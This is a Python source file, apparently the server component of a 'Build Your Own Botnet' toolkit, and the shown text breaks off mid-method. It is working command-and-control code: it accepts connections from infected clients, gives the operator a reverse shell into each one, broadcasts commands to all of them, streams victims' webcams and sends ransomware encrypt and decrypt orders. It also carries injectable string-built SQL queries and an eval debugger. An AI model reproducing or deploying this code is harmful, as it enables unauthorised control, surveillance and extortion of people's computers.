#!/usr/bin/python
"""
Build Your Own Botnet
github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library 
import os
import sys
import json
import time
import Queue
import pickle
import socket
import struct
import base64
import random
import logging
import requests
import colorama
import argparse
import datetime
import functools
import cStringIO
import threading
import subprocess
import collections

# external
import cv2
import numpy
import configparser
import SocketServer
import mysql.connector

# cryptography
import Crypto.Util
import Crypto.Cipher.AES
import Crypto.PublicKey.RSA
import Crypto.Cipher.PKCS1_OAEP

# byob
if os.name is 'nt':
    from modules import security, util
else:
    from . import security, util



def threaded(function):
    """
    Decorator for making a function threaded
    """
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded


class TaskHandler(SocketServer.BaseRequestHandler):

    def handle(self):
        while True:
            try:
                bits = self.connection.recv(4)
                if len(bits) < 4:
                    break
                size = struct.unpack('>L', bits)[0]
                buff = self.connection.recv(size)
                while len(buff) < size:
                    buff += self.connection.recv(size - len(buff))
                data = pickle.loads(buff)
                log  = logging.makeLogRecord(data)
                self.handle_log(log)
            except Exception as e:
                logging.error(str(e), extra={'submodule': TaskHandler.__name__})

    def handle_log(self, log):
        try:
            logger  = logging.getLogger(log.client)
            handler = logging.FileHandler('%s.log' % log.client)
            logger.handlers = [handler]
            logger.handle(log)
        except Exception as e:
            logging.error(str(e), extra={'submodule': TaskHandler.__name__})


class TaskServer(SocketServer.ThreadingTCPServer):

    allow_reuse_address = True

    def __init__(self, host='0.0.0.0', port=1338, handler=TaskHandler):
        SocketServer.ThreadingTCPServer.__init__(self, (host, port), handler)
        self._abort  = False
        self.timeout = 1.0

    def abort(self):
        self._abort = True

    def serve_until_stopped(self):
        while True:
            rd, wr, ex = select.select([self.socket.fileno()], [], [], self.timeout)
            if rd:
                self.handle_request()
            abort = self._abort
            if abort:
                break


class Database(mysql.connector.MySQLConnection):
    """
    Database (Build Your Own Botnet)
    """

    _debug = True

    def __init__(self, server_host='localhost', server_port=1337, **kwargs):

        """
        connect to MySQL and setup the BYOB database

            server_host     public IP of server

            server_port     port server is listening on

            kwargs:

                host        hostname/IP address of MySQL host machine

                user        authorized account username

                password    authorized account password

        """
        super(Database, self).__init__(**kwargs)
        self.config(**kwargs)
        self.logger = util.tasklogger(server_host, server_port)
        self._tasks = [os.path.splitext(_)[0] for _ in os.listdir('modules')]
        self._query = self.cursor(dictionary=True)
        self._color = util.color()
        self._setup()

    def _setup(self):
        try:
            with open('resources/setup.sql', 'r') as fd:
                sql = fd.read().replace('{user}', self.user).replace('{host}', self.server_host)
                self.execute_file(sql)
            return True
        except Exception as e:
            util.debug(e)
        return False

    def _display(self, data, indent=2):
        if isinstance(data, dict):
            for k,v in data.items():
                if isinstance(v, datetime.datetime):
                    data[k] = v.ctime()
            i = data.pop('id',None)
            print(colorama.Style.BRIGHT + colorama.Fore.RESET + str(i).rjust(indent-3)) if i else None
            for k,v in data.items():
                if isinstance(v, unicode):
                    try:
                        j = json.loads(v.encode())
                        self._display(j, indent+2)
                    except:
                        print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
                elif isinstance(v, list):
                    for i in v:
                        if isinstance(v, dict):
                            print(colorama.Style.BRIGHT + self._color + str(k).ljust(4  * indent).center(5 * indent))
                            self._display(v, indent+2)
                        else:
                            print(colorama.Style.BRIGHT + self._color + str(i).ljust(4  * indent).center(5 * indent))
                elif isinstance(v, dict):
                    print(colorama.Style.BRIGHT + self._color + str(k).ljust(4  * indent).center(5 * indent))
                    self._display(v, indent+1)
                elif isinstance(v, int):
                    if v in (0,1):
                        print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(bool(v)).encode())
                    else:
                        print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
                else:
                    print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
        elif isinstance(data, list):
            for row in data:
                if isinstance(row, dict):
                    self._display(row, indent+2)
                else:
                    print(colorama.Style.BRIGHT + self._color + str(row).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())

        else:
            if hasattr(data, '_asdict'):
                data = data._asdict()
            if isinstance(data, collections.OrderedDict):
                data = dict(data)
            if isinstance(data, dict):
                i = data.pop('id',None)
                print(colorama.Style.BRIGHT + colorama.Fore.RESET + str(i).rjust(indent-1)) if i else None
                self._display(data, indent+2)

            else:
                print(colorama.Style.BRIGHT + self._color + str(data.encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + v.encode()))


    def _reconnect(self):
        try:
            self.reconnect()
            self._query = self.cursor(named_tuple=True)
            return "{}@{} reconnected".format(self.database.user, self.database.server_host)
        except Exception as e:
            util.debug("{} error: {}".format(self._reconnect.func_name, str(e)))


    def update_client(self, client_id, online):
        """
        Update client status to online/offline
        """
        try:
            if isinstance(client_id, str):
                self.execute_query("UPDATE tbl_clients SET online=%d, last_online=NOW() WHERE uid='%s'" % (int(online), str(client_id)))
            elif isinstance(client_id, int):
                self.execute_query("UPDATE tbl_clients SET online=%d, last_online=NOW() WHERE id=%d" % (int(online), int(client_id)))
            else:
                util.debug("{} error: invalid input type (expected {}, received {})".format(self.offline_client.func_name, list, type(client_id)))
        except Exception as e:
            util.debug("{} error: {}".format(self.offline_client.func_name, str(e)))


    def client_remove(self, client_id):
        """
        Remove client from database
        """
        try:
            if isinstance(client_id, str):
                self.execute_query("DELETE FROM tbl_clients WHERE id='%s'" % task_id)
            elif isinstance(client_id, int):
                self.execute_query("DELETE FROM tbl_clients WHERE id=%d" % client_id)
            else:
                util.debug("{} error: invalid input type (expected {}, received {})".format(self.client_remove.func_name, list, type(client_id)))
        except Exception as e:
            util.debug("{} error: {}".format(self.client_remove.func_name, str(e)))


    def get_clients(self, verbose=False, display=False):
        """
        Return json list of clients
        """
        clients = self.execute_query("SELECT * FROM tbl_clients ORDER BY online" if verbose else "SELECT id, public_ip, uid, last_online FROM tbl_clients ORDER BY online desc")   
        if display:
            self._display(clients)
        return clients


    def get_tasks(self, client_id=None, display=True):
        """
        Get any/all clients task results
        """
        try:
            tasks = None
            if client_id:
                try:
                    tasks = self.execute_query("SELECT * FROM tbl_tasks WHERE client='{}'".format(client_id), display=False)
                except Exception as e:
                    util.debug("{} error: {}".format(self.show_results.func_name, str(e)))
            else:
                try:
                    tasks = self.execute_query("SELECT * FROM tbl_tasks", display=False)
                except Exception as e:
                    util.debug("{} error: {}".format(self.show_results.func_name, str(e)))
            if tasks:
                if display:
                    self._display(tasks)
                return tasks
        except Exception as e:
            util.debug("{} error: {}".format(self.get_tasks.func_name, str(e)))

    def handle_client(self, client):
        """
        Handle a new/current client by adding/updating database
        """
        args = (json.dumps(client._info), '@client')
        _ = self.execute_procedure('sp_handle_client', args=args, display=False)
        info = self.execute_query('SELECT @client', display=False)
        client._info = info
        if client._info['uid'] not in self.tasks:
            self.tasks[client._info['uid']] = []
        return info

    def handle_task(self, task):
        """ 
        Adds results to database for configured task type
        """
        try:
            if not isinstance(task, dict):
                try:
                    task = json.loads(str(task))
                except:
                    pass
            if isinstance(task, dict):
                args = (json.dumps(task), '@taskid')
                _ = self.execute_procedure("sp_handle_task", args=args)
                task_id = self.execute_query("SELECT @taskid")
                self.tasks[task['client']].append(task_id)
                return task_id
            else:
                util.debug("{} error: invalid input type (expected {}, received {})".format(self.handle_task.func_name, dict, type(task)))
        except Exception as e:
            util.debug("{} error: {}".format(self.handle_task.func_name, str(e)))


    def set_tasks(self, tasks):
        """
        Set types of task results for database to store
        """
        if isinstance(tasks, list) or isinstance(tasks, set):
            self._store_tasks = tasks
        elif isinstance(tasks, dict):
            self._store_tasks = [task for task,value in tasks.items() if value]
        else:
            util.debug("{} error: argument 'tasks' must be type {}".format(self.set_tasks.func_name, list))


    def execute_query(self, query, display=False):
        """
        Execute a query and return result, optionally printing output to stdout
        """
        result = []
        try:
            if not self.is_connected():
                self._reconnect()
            result = []
            self._query.execute(query)
            output = self._query.fetchall()
            if output:
                for row in output:
                    if hasattr(row, '_asdict'):
                        row = row._asdict()
                    for key,value in [(key,value) for key,value in row.items() if isinstance(value, datetime.datetime)]:
                        row[key] = value.ctime()
                    if display:
                        self._display(row)
                    result.append(row)
        except (mysql.connector.ProgrammingError, mysql.connector.InterfaceError) as e:
            util.debug(e)
        except Exception as e:
            util.debug("{} error: {}".format(self.execute_query.func_name, str(e)))
        finally:
            return result


    def execute_procedure(self, procedure, args=[], display=False):
        """
        Execute a stored procedure and return result, optionally printing output to stdout
        """
        result = []
        try:
            if not self.is_connected():
                self._reconnect()
            cursor = self.cursor(dictionary=True)
            cursor.callproc(procedure, args)
            result = [row for row in cursor.stored_results() for row in result.fetchall()]
        except (mysql.connector.InterfaceError, mysql.connector.ProgrammingError):
            pass
        finally:
            return result


    def execute_file(self, filename=None, sql=None, display=False):
        """
        Execute SQL commands sequentially from a string or file
        """
        try:
            result = []
            if os.path.isfile(filename):
                with open(filename) as stmts:
                    for line in self._query.execute(stmts.read(), multi=True):
                        result.append(line)
                        if display:
                            print(line)
            elif isinstance(sql, str):
                for line in self._query.execute(sql, multi=True):
                    result.append(line)
                    if display:
                        print(line)
            elif isinstance(sql, list) or isinstance(sql, tuple):
                sql = '\n'.join(sql)
                for line in self._query.execute_query(sql, multi=True):
                     result.append(line)
                     if display:
                         print(line)
            return result
        except Exception as e:
            print("{} error: {}".format(self.execute_file.func_name, str(e)))



class Server(threading.Thread):

    def __init__(self, port=1337, debug=True, **kwargs):
        """
        Server (Build Your Own Botnet)
        """
        super(Server, self).__init__()
        self.config             = self._get_config()
        self.database           = self._get_database()
        self.clients            = {}
        self.current_client     = None
        self._prompt            = None
        self._abort             = False
        self._count             = 1
        self._debug             = debug
        self._name              = time.time()
        self._lock              = threading.Lock()
        self._active            = threading.Event()
        self._socket            = self._get_socket()
        self._text_color        = util.color()
        self._text_style        = colorama.Style.DIM
        self._prompt_color      = colorama.Fore.RESET
        self._prompt_style      = colorama.Style.BRIGHT
        self._commands          = {
            'help'          :   self.help,
            'exit'          :   self.quit,
            'quit'          :   self.quit,
            '$'             :   self.debugger,
            'debug'         :   self.debugger,
            'settings'      :   self.settings,
            'options'       :   self.settings,
            'clients'       :   self.client_list,
            'client'        :   self.client_shell,
            'ransom'        :   self.client_ransom,
            'webcam'        :   self.client_webcam,
            'kill'          :   self.client_remove,
            'back'          :   self.client_background,
            'bg'            :   self.client_background,
            'sendall'	    :   self.task_broadcast,
            'braodcast'     :   self.task_broadcast,
            'results'       :   self.task_list,
            'tasks'         :   self.task_list,
            'query'         :   self.database.execute_query
            }


    def _server_prompt(self, data):
        with self._lock:
            return raw_input(self._prompt_color + self._prompt_style + '\n' + bytes(data).rstrip())


    def _error(self, data):
        util.debug(str(data))
        if self.current_client:
            with self.current_client._lock:
                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
        else:
            with self._lock:
                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')


    def _print(self, info):
        lock = self._lock if not self.current_client else self.current_client._lock
        if isinstance(info, str):
            try:
                info = json.loads(info)
            except: pass
        if isinstance(info, dict):
            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
            keys    = {k: key_len[k] for k in sorted(key_len.keys())}
            with lock:
                for key in keys.values():
                    if info.get(key) and info.get(key) != 'None':
                        if len(str(info.get(key))) > 80:
                            info[key] = str(info.get(key))[:77] + '...'
                        info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))
                        print('\x20' * 4 + self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))
        else:
            with lock:
                print("Server method {} received invalid input ({}): '{}'".format(self._print.func_name, type(info), repr(info)))


    def _return(self, data=None):
        if not self.current_client:
            with self._lock:
                if data:
                    print('\n' + data + '\n')
                else:
                    print(self._prompt, end="")
        else:
            with self.current_client._lock:
                if data:
                    print('\n' + data + '\n')
                else:
                    print(self.current_client.prompt, end="")

    def _get_config(self):
        config = configparser.ConfigParser()
        try:
            config.read('../config.ini')
        except:
            raise byobError("missing configuration file 'config.ini'")
        return config


    def _get_socket(self, port=1337):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', port))
            s.listen(10)
            return s
        except Exception as e:
            self._error(str(e))

    def _get_database(self):
        try:
            print(util.color() + colorama.Style.BRIGHT + "\n\n" + open('resources/banner.txt').read() + colorama.Fore.WHITE + colorama.Style.DIM + '\n{:>40}\n{:>25}\n'.format('Build Your Own Botnet','v0.1.2'))
            print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + "[?] " + colorama.Fore.RESET + colorama.Style.DIM + "Hint: show usage information with the 'help' command\n")
            db = None
            if self.config.has_section('database'):
                try:
                    tasks = []
                    if self.config.has_section('tasks'):
                        tasks = [k for k,v in self.config['tasks'].items() if v]
                    db = Database(**self.config['database'])
                    db.cmd_init_db('byob')
                    print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Connected to database")
                except:
                    max_v = max(map(len, self.config['database'].values())) + 2
                    print(colorama.Fore.RED + colorama.Style.BRIGHT + "[-] " + colorama.Fore.RESET + colorama.Style.DIM + "Error: unable to connect to the currently configured MySQL database\n\thost: %s\n\tuser: %s" % ('\x20' * 4 + ' ' * 4 + self.config['database'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['database'].get('user').rjust(max_v).rjust(max_v)))
            else:
                try:
                    db = Database()
                    db.cmd_init_db('byob')
                except:
                    max_v = max(map(len, self.config['database'].values())) + 2
                    print(colorama.Fore.RED + colorama.Style.BRIGHT + "[-] " + colorama.Fore.RESET + colorama.Style.DIM + "Error: unable to connect to the currently configured MySQL database\n\thost:  %s\n\tuser: %s" % ('\x20' * 4 + ' ' * 4 + self.config['database'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['database'].get('user').rjust(max_v).rjust(max_v)))
            return db
        except Exception as e:
            self._error("{} error: {}".format(self._get_database.func_name, str(e)))


    def _get_client(self, client_id):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Invalid Client ID")
        return client


    def _get_clients(self):
        return [v for v in self.clients.values()]


    def _get_api_key(self, task):
        if isinstance(task, dict) and 'request' in task:
            request = task.get('request')
            section, _, option = request.partition(' ')
            if server.config.has_section(section):
                if server.config[section].has_option(option):
                    result = server.config[section].get(option)
                    task.update({'result' : result})
                    output = self._encrypt(json.dumps(task), client.session_key)
                    connection.sendall(struct.pack('L', len(output)) + output)
                else:
                    self._return("%s error: invalid API request ('%s')" % (self._handle_request.func_name, option))
            else:
                self._return("%s error: invalid request type ('%s')" % (self._handle_request.func_name, section))
        else:
            self._return("%s warning: invalid input type (expected {}, receieved {})" % (self._handle_request.func_name, dict, type(task)))


    @threaded
    def _connection_handler(self, sock=None):
        if not sock:
            sock = self._socket
        while True:
            conn, addr = sock.accept()
            client  = ClientHandler(connection=conn, name=self._count, server=self, lock=self._lock)
            self.clients[self._count] = client
            self._count  += 1
            client.start()                        
            if not self.current_client:
                print(self._prompt_color + self._prompt_style + str("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd()), end="")
            else:
                if self.current_client._prompt:
                    print(str(self.current_client._prompt) % int(self.current_client._name), end="")


    def debugger(self, raw_python_code):
        if self._debug:
            try:
                return eval(raw_python_code)
            except Exception as e:
                return "Error: %s" % str(e)
        else:
            return "Debugging mode: disabled"


    def quit(self):
        if self._server_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
            for client in self._get_clients():
                client._active.set()
                self.task_send('passive', client._name)
        self._abort = True
        self._active.clear()
        print(colorama.Fore.RESET + colorama.Style.NORMAL)
        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os._name is 'nt' else "kill -9 {}".format(os.getpid())).read()
        print('Exiting...')
        sys.exit(0)


    def help(self, info=None):
        column1 = 'command <arg>'
        column2 ='description'
        info    = info if info else {"back": "background the current client", "client <id>": "interact with client via reverse shell", "clients": "list current clients", "exit": "exit the program but keep clients alive", "sendall <command>": "send a command to all connected clients", "settings <value> [options]": "list/change current display settings"}
        max_key = max(map(len, info.keys() + [column1])) + 2
        max_val = max(map(len, info.values() + [column2])) + 2
        print('\n' + self._text_color + colorama.Style.BRIGHT + column1.center(max_key) + column2.center(max_val))
        for key in sorted(info):
            print(self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))


    def display(self, info):
        print('\n')
        if isinstance(info, dict):
            if len(info):
                self._print(info)
        elif isinstance(info, list):
            if len(info):
                for data in info:
                    print(self._text_color + colorama.Style.BRIGHT + '  %d\n' % int(info.index(data) + 1), end="")
                    self.display(data)
        elif isinstance(info, str):
            try:
                self._print(json.loads(info))
            except:
                print(self._text_color + self._text_style + str(info))
        else:
            self._error("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))


    def settings(self, args=None):
        if not args:
            try:
                text_color   = [color for i in [getattr(c.Fore, color) for color in ['BLUE','CYAN','RED','BLACK','MAGENTA','GREEN']] if i == self._text_color][0]
                text_style   = [style for i in [getattr(c.Style, style) for style in ['DIM','BRIGHT','NORMAL']] if i == self._text_style][0]
                prompt_color = [color for i in [getattr(c.Fore, color) for color in ['BLUE','CYAN','RED','BLACK','MAGENTA','GREEN']] if i == self._prompt_color][0]
                prompt_style = [style for i in [getattr(c.Style, style) for style in ['DIM','BRIGHT','NORMAL']] if i == self._prompt_style][0]
            except Exception as e:
                return '{} error: {}'.format(self.settings.func_name, str(e))
            print("\n")
            print(colorama.Fore.RESET + colorama.Style.BRIGHT + "Settings".center(40))
            print(colorama.Fore.RESET + colorama.Style.DIM + 'text color/style: {}'.format(' '.join(text_color, text_style).center(40)))
            print(colorama.Fore.RESET + colorama.Style.DIM + 'prompt color/style: {}'.format(' '.join(prompt_color, prompt_style).center(40)))
            print(colorama.Fore.RESET + colorama.Style.DIM + 'debug: {}'.format('true' if self._debug else 'false'))
            print(self._text_color + self._text_style)
        else:
            target, _, options = args.partition(' ')
            setting, _, option = options.partition(' ')
            option = option.upper()
            print(self._text_color + self._text_style)
            if target == 'prompt':
                if setting == 'color':
                    if not hasattr(colorama.Fore, option):
                        print("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
                    self._prompt_color = getattr(colorama.Fore, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt color changed to " + self._prompt_color + self._prompt_style + option)
                elif setting == 'style':
                    if not hasattr(colorama.Style, option):
                        print("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
                    self._prompt_style = getattr(colorama.Style, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt style changed to " + self._prompt_color + self._prompt_style + option)
                else:
                    print("usage: settings prompt <option> [value]")
            elif target == 'text':
                if setting == 'color':
                    if not hasattr(colorama.Fore, option):
                        print("usage: settings text color [value]\ncolors:     white/black/red/yellow/green/cyan/magenta")
                    self._text_color = getattr(colorama.Fore, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text color changed to " + self._text_color + self._text_style + option)
                elif setting == 'style':
                    if not hasattr(colorama.Style, option):
                        print("usage: settings text style [value]\nstyles:     bright/normal/dim")
                    self._text_style = getattr(colorama.Style, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text style changed to " + self._text_color + self._text_style + option)
                else:
                    print("usage: settings text <option> [value]")
            elif target == 'debug':
                if setting.lower() in ('true', 'on'):
                    self._debug = True
                elif settings.lower() in ('false', 'off'):
                    self._debug = False
                else:
                    print("usage: settings debug <on/off> (or true/false)")
            else:
                print('\nDisplay Settings\n\n  usage:  settings <type> <option> <color|style>\n  \n    type   - text, prompt\n    option - color, style\n    color  - black, white, blue, red, green, magenta, yellow\n    style  - dim, normal, bright\n\nDebugging Mode\n\t\n  usage: settings debug <on|off>\n')


    def task_send(self, command, client_id=None):
        client = self._get_client(client_id)
        if client:
            try:
                task    = {'client': client.info['id'], 'command': command}
                task_id = self.database.handle_task(task)
                data    = self._encrypt(json.dumps(task), client.session_key)
                sock.sendall(struct.pack("L", len(data))+data)
                client._connection.sendall(data)
            except Exception as e:
                time.sleep(1)
                self._error(str(e))


    def task_recv(self, client_id=None, connection=None):
        if client_id:
            if str(client_id).isdigit() and int(client_id) in self.clients:
                client      = self.clients[int(client_id)]
                connection  = self.clients[int(client_id)]._connection
            elif self.current_client:
                client      = self.current_client
                connection  = self.current_client._connection
            else:
                self._error("Invalid Client ID: {}".format(client_id))
        if connection:
            try:
                header_size = struct.calc_size("L")
                header = connection.recv(header_size)
                msg_size = struct.unpack("L", header)[0]
                msg = ""
                while len(msg) < msg_size:
                    msg += connection.recv(1)
                if msg:
                    try:
                        data = self._decrypt(msg, client.session_key)
                        try:
                            return json.loads(data)
                        except Exception as e:
                            util.debug(e)
                    except Exception as e1:
                        util.debug(str(e1))
            except Exception as e:
                self._error("{} error: {}".format(self.task_recv.func_name, str(e)))
                time.sleep(1)
                client._active.clear()
                self.client_remove(client._name)
                self._active.set()
                self.run()


    def task_list(self, client_id=None):
        try:
	    client = self._get_client(client_id) if client_id else None
	    uid = client.uid if client else None
            if uid:
		return self.database.get_tasks(uid)
	    else:
		return self.database.get_tasks()
        except Exception as e:
            util.debug(e)
            

    def task_broadcast(self, msg):
        for client in self._get_clients():
            try:
                self.task_send(msg, client._name)
            except Exception as e:
                self._error('{} returned error: {}'.format(self.task_broadcast.func_name, str(e)))


    def client_webcam(self, args=''):
        try:
            if not self.current_client:
                self._error( "No client selected")
                return
            client = self.current_client
            result = ''
            mode, _, arg = args.partition(' ')
            client._active.clear()
            if not mode or str(mode).lower() == 'stream':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                retries = 5
                while retries > 0:
                    try:
                        port = random.randint(6000,9999)
                        s.bind(('0.0.0.0', port))
                        s.listen(1)
                        cmd = 'webcam stream {}'.format(port)
                        self.task_send(cmd, client._name)
                        conn, addr  = s.accept()
                        break
                    except:
                        retries -= 1
                header_size = struct.calcsize("L")
                window_name = addr[0]
                cv2._namedWindow(window_name)
                data = ""
                try:
                    while True:
                        while len(data) < header_size:
                            data += conn.recv(4096)
                        packed_msg_size = data[:header_size]
                        data = data[header_size:]
                        msg_size = struct.unpack("L", packed_msg_size)[0]
                        while len(data) < msg_size:
                            data += conn.recv(4096)
                        frame_data = data[:msg_size]
                        data = data[msg_size:]
                        frame = pickle.loads(frame_data)
                        cv2.imshow(window_name, frame)
                        key = cv2.waitKey(70)
                        if key == 32:
                            break
                finally:
                    conn.close()
                    cv2.destroyAllWindows()
                    result = 'Webcam stream ended'
            else:
                self.task_send("webcam %s" % args, client._name)
                task    = self.task_recv(client._name)
                result  = task.get('result')
            self.display(result)
        except Exception as e:
            util.debug("webcam stream failed with error: {}".format(str(e)))



    def client_remove(self, client_id):
        if not str(client_id).isdigit() or int(client_id) not in self.clients:
            return
        else:
            try:
                client = self.clients[int(client_id)]
                client._active.clear()
                self.task_send('kill', client_id)
                try:
                    client._connection.close()
                except: pass
                try:
                    client._connection.shutdown()
                except: pass
                _ = self.clients.pop(int(client_id), None)
                del _
                print(self._text_color + self._text_style)
                if not self.current_client:
                    with self._lock:
                        print('Client {} disconnected'.format(client_id))
                    self._active.set()
                    client._active.clear()
                    return self.run()
                elif int(client_id) == self.current_client._name:
                    with self.current_client._lock:
                        print('Client {} disconnected'.format(client_id))
                    self._active.clear()
                    self.current_client._active.set()
                    return self.current_client.run()
                else:
                    with self._lock:
                        print('Client {} disconnected'.format(client_id))
                    self._active.clear()
                    self.current_client._active.set()
                    return self.current_client.run()
            except Exception as e:
                self._error('{} failed with error: {}'.format(self.client_remove.func_name, str(e)))


    def client_list(self, args=None):
        args    = str(args).split()
        verbose = bool('-v' in args or '--verbose' in args)
        lock    = self._lock if not self.current_client else self.current_client._lock
        with lock:
            print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format('Client ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format('Session ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('IP Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n----------------------------------------------------------------------------------------------')
            clients = self.database.get_clients(verbose=verbose)
            for k, v in clients.items():
                print(self._text_color + colorama.Style.BRIGHT + '{:>3}'.format(k) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.info['id']) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.session) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format(v._connection.getpeername()[0]))
            print('\n')


    def client_ransom(self, args=None):
        if self.current_client:
            if 'decrypt' in str(args):
                self.task_send("ransom decrypt %s" % key.exportKey(), self.current_client._name)
            elif 'encrypt' in str(args):
                self.task_send("ransom %s" % args, self.current_client._name)
            else:
                self._error("Error: invalid option '%s'" % args)
        else:
            self._error("No client selected")


    def client_shell(self, client_id):
        if not str(client_id).isdigit() or int(client_id) not in self.clients:
            self._error("Client '{}' does not exist".format(client_id))
        else:
            self._active.clear()
            if self.current_client:
                self.current_client._active.clear()
            client = self.clients[int(client_id)]
            self.current_client = client
            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(client._name, client._connection.getpeername()[0]) + self._text_color + self._text_style)
            self.current_client._active.set()
            return self.current_client.run()


    def client_background(self, client_id=None):
        if not client_id:
            if self.current_client:
                self.current_client._active.clear()
        elif str(client_id).isdigit() and int(client_id) in self.clients:
                self.clients[int(client_id)]._active.clear()
        self.current_client = None
        self._active.set()


    def run(self):
        self._active.set()
        while True:
            try:
                self._active.wait()
                self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd()
                cmd_buffer   = self._server_prompt(self._prompt)
                if cmd_buffer:
                    output = ''
                    cmd, _, action  = cmd_buffer.partition(' ')
                    if cmd in self._commands:
                        try:
                            output  = self._commands[cmd](action) if len(action) else self._commands[cmd]()
                        except Exception as e1:
                            output  = str(e1)
                    elif cmd == 'cd':
                        os.chdir(action)
                    else:
                        try:
                            output = subprocess.check_output(cmd_buffer, shell=True)
                        except: pass
                    if output:
                        self.display(str(output))
                if self._abort:
                    break
            except KeyboardInterrupt:
                break
        print('Server shutting down')
        sys.exit(0)


class ClientHandler(threading.Thread):

    _prompt = None

    def __init__(self, server=None, connection=None, name=None, lock=None):
        """
        ClientHandler: wrapper for handling a client connection
            server          byob.server.Server instance that is managing clients
            connection      socket with active connection
            lock            threading.Lock object shared between all clients
        """
        super(ClientHandler, self).__init__()
        self._lock          = lock
        self._name          = name
        self._server        = server
        self._socket        = connection
        self._active        = threading.Event()
        self.session_key    = self._session_key()
        self.info           = self._info()
        self._socket.setblocking(True)


    def _error(self, data):
        with self._lock:
            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self._name) + bytes(data) + '\n')


    def _kill(self):
        self._active.clear()
        self._server.client_remove(self._name)
        self._server.current_client = None
        self._server._active.set()
        self._server.run()


    def _info(self):
        try:
            buf  = ''
            while '\n' not in buf:
                buf += self._socket.recv(1024)
            text = server._decrypt(buf.rstrip(), self.session_key)
            data = json.loads(text.rstrip())
            info = self.database.handle_client(data)
            return info
        except Exception as e:
            self._error(str(e))


    def _session_key(self):
        try:
